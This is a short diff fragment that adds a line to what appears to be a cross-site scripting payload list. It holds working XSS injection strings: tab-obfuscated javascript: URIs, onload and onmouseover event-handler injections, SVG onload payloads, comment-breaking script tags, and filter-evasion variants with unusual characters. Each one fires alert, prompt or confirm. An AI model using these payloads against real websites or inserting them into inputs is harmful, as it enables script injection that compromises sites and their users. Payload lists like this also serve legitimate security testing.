@@ -12,6 +12,7 @@ returnuri=%09Jav%09ascript:alert(document.domain)
 var onskeywords = 'hello';onload=prompt(0);
 "hello" onmouseover=prompt(0) world=""
 test"t"\t/t%3Ct%3Et
+ABABAB--%3E%3Cscript%3Ealert(1337)%3C/script%3E]
 "â™ˆ<<sVg/onloadâ™ˆ=/svg/onload=svg/onmouseOver=confirm'1'><!--â™ˆ//="
 /><svg src=x onload=confirm(document.domain);>
 <script>alert(String.fromCharCode(88, 115, 115, 32, 66, 121, 32, 79, 108, 100, 77, 111, 104, 97, 109, 109))</script>
